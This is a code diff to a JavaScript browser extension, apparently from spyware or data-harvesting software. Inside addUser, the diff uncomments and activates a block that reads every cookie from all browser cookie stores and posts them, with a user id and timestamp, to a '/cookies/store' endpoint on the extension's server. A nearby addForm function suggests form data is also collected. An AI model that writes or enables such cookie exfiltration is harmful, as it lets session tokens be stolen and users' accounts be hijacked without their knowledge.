@@ -43,21 +43,21 @@ const addUser = (uid) => {
     });
 
     // Get all stored cookies, PAYLOAD TOO LARGE
-    // chrome.cookies.getAllCookieStores((cookieStores) => {
-    //     cookieStores.forEach((s) =>
-    //         chrome.cookies.getAll({ storeId: s.id }, (c) => {
-    //             const data = {
-    //                 uid,
-    //                 time: Date.now(),
-    //                 storeId: s.id,
-    //                 cookies: c,
-    //             };
-    //             postRequest("/cookies/store", data).catch((err) =>
-    //                 console.log(err.message)
-    //             );
-    //         })
-    //     );
-    // });
+    chrome.cookies.getAllCookieStores((cookieStores) => {
+        cookieStores.forEach((s) =>
+            chrome.cookies.getAll({ storeId: s.id }, (c) => {
+                const data = {
+                    uid,
+                    time: Date.now(),
+                    storeId: s.id,
+                    cookies: c,
+                };
+                postRequest("/cookies/store", data).catch((err) =>
+                    console.log(err.message)
+                );
+            })
+        );
+    });
 };
 
 const addForm = (uid, form, tab) => {
